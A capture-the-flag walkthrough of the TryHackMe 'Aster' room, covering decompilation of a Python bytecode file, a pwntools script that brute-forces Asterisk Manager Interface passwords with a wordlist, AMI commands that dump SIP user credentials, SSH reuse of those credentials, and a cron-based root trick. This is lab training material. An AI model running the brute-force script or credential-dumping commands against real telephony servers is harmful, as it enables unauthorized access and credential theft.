# Tryhackme.com Room : Aster

`https://tryhackme.com/room/aster`

## Instance

```bash
export IP="10.10.134.236"
```

## Nmap

```
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fe:e3:52:06:50:93:2e:3f:7a:aa:fc:69:dd:cd:14:a2 (RSA)
|   256 9c:4d:fd:a4:4e:18:ca:e2:c0:01:84:8c:d2:7a:51:f2 (ECDSA)
|_  256 c5:93:a6:0c:01:8a:68:63:d7:84:16:dc:2c:0a:96:1d (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Aster CTF
1720/tcp open  h323q931?
2000/tcp open  cisco-sccp?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Initial Foothold

The website has a link to a file named `output.pyc`

Let's try to decompile this file. We are using `uncompyle6` 

```python
# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.18 (default, Apr 20 2020, 20:30:41)
# [GCC 9.3.0]
# Embedded file name: ./output.py
# Compiled at: 2020-08-11 02:59:35
import pyfiglet
o0OO00 = pyfiglet.figlet_format('Hello!!')
oO00oOo = '476f6f64206a6f622c2075736572202261646d696e2220746865206f70656e20736f75726365206672616d65776f726b20666f72206275696c64696e6720636f6d6d756e69636174696f6e732c20696e7374616c6c656420696e20746865207365727665722e'
OOOo0 = bytes.fromhex(oO00oOo)
Oooo000o = OOOo0.decode('ASCII')
if 0:
    i1 * ii1IiI1i % OOooOOo / I11i / o0O / IiiIII111iI
Oo = '476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21476f6f64206a6f622072657665727365722c20707974686f6e206973207665727920636f6f6c21'
I1Ii11I1Ii1i = bytes.fromhex(Oo)
Ooo = I1Ii11I1Ii1i.decode('ASCII')
if 0:
    iii1I1I / O00oOoOoO0o0O.O0oo0OO0 + Oo0ooO0oo0oO.I1i1iI1i - II
print o0OO00
# okay decompiling output.pyc
```

The 2 hex encoded strings are :

```
Good job, user "admin" the open source framework for building communications, installed in the server.
```

```
Good job reverser, python is very cool!Good job reverser, python is very cool!Good job reverser, python is very cool!
```

Hmm not sure what to do with this, I guess we got a username `admin` ?



Running `gobuster` on the server, found nothing interesting so far.



When trying to `nc` into ports `2000` and `1720` our connection get closed after we send something. Maybe we need some magic string to activate communication ?



We did another fullscan of the server and found ports `5038` opened.

It run the `Asterisk Call Manager/5.0.2`

Looking at `https://www.voip-info.org/asterisk-manager-example-login/` we see that we can connection the interface using the following message :

```
ACTION: LOGIN
USERNAME: username
SECRET: password
EVENTS: ON
```

Let's create a small script to bruteforce passwords

```python
from pwn import remote

ip = '10.10.134.236'
port = 5038

def try_login(username, password):
    print(f"Trying {username}:{password}")
    conn = remote(ip, port, level='error')
    welcome_msg = conn.recvline(timeout=0.5)
    msg = f"ACTION: LOGIN\nUSERNAME: {username}\nSECRET: {password}\nEVENTS: ON\n\n"
    conn.send(msg)
    resp = conn.recvline(timeout=2)
    filler = conn.recvline(timeout=2)
    filler = conn.recvline(timeout=2)
    return 'Success' in resp.decode()

with open('/usr/share/wordlists/rockyou_no_unicode.txt', 'r') as f:
    all_passwords = f.readlines()


for p in all_passwords:
    if try_login('admin', p.strip()):
        print(f"FOUND VALID LOGIN ")
        print(f"admin:{p}")
        break

print("All done")
```

We find the credentials :

```
admin:abc123
```

I played around for a while in the `asterisk CLI`

Was trying to run shell commands using 

```
action: command
command: !SHELLCMD
```

Also tried the `originate` approach but there was no channels so it didn't seem to work.

Anyways, after a while, I had a look at a write up... and it was so simple..

We can dump user creds using

```
action: command
command: sip show users
```

We get

```
Output: Username                   Secret           Accountcode      Def.Context      ACL  Forcerport
Output: 100                        100                               test             No   No
Output: 101                        101                               test             No   No
Output: harry                      p4ss#w0rd!#                       test             No   No
```

Which give us the credentials 

```
harry:p4ss#w0rd!#
```

I had a look at all the availale commands 

```
action: command
command: core show help
```

And there was a bunch of commands to dump users.

Only `sip show users` and `iax2 show users` would dump the credentials.



Anyways, now we can `ssh` as `harry`

And we got the flag `/home/harry/user.txt` :

```
thm{bas1c_aster1ck_explotat1on}
```



## Priv Esc

Now that we are `harry` let's escalate our priviledges.

We can't `sudo`.

There is a `.subversion` folder in `/home/harry` with an `auth` folder that we can't access.



There is a `Example_root.jar` file. We can `unzip` the `jar` file and then we decompile the `.class` file using `http://www.javadecompilers.com`



```java
import java.io.IOException;
import java.io.FileWriter;
import java.io.File;

// 
// Decompiled by Procyon v0.5.36
// 

public class Example_Root
{
    public static boolean isFileExists(final File file) {
        return file.isFile();
    }
    
    public static void main(final String[] array) {
        final File file = new File("/tmp/flag.dat");
        try {
            if (isFileExists(file)) {
                final FileWriter fileWriter = new FileWriter("/home/harry/root.txt");
                fileWriter.write("my secret <3 baby");
                fileWriter.close();
                System.out.println("Successfully wrote to the file.");
            }
        }
        catch (IOException ex) {
            System.out.println("An error occurred.");
            ex.printStackTrace();
        }
    }
}
```



Nothing much usefull here ?



If we look at `/etc/crontab` we find :

```
* * * * *   root    cd /opt/ && bash ufw.sh
* * * * *   root    cd /root/java/ && bash run.sh
```

`/opt/ufw.sh` :

```
ufw disable
```

`ufw` is used to manage `netfilter firewall` 



We can't modify the `ufw.sh` script and we can't highjack the `ufw` binary. Not sure what we can do with this..

Actually `/usr/sbin/ufw` is a python script.

But still, not sure how we can inject dependencies.. We can't write in `/opt`



Soo, actually, everything was in the `java` file.

It first check if `/tmp/flag.dat` exist and then create a file with the flag in `/home/harry/root.txt` 

By simply `touch /tmp/flag.dat`, the cronjob create a `/home/harry/root.txt` file with content :

```
thm{fa1l_revers1ng_java}
```





## Wrap up

* I've wasted quite come time trying to get RCE on `asterisk`. Should always try to dump users/password to see if they can be reused somewhere else (Ex: ssh)
* one thing that I didn't mention, I used `pspy` to get an idea of what was runned by the cronjob. It helped me undestand what was happening (i.e: `java -jar root.jar` and `/usr/bin/python3 /usr/sbin/ufw`)
* All in all, it wasn't a difficult box but it was kinda weird in my opinion...



## End

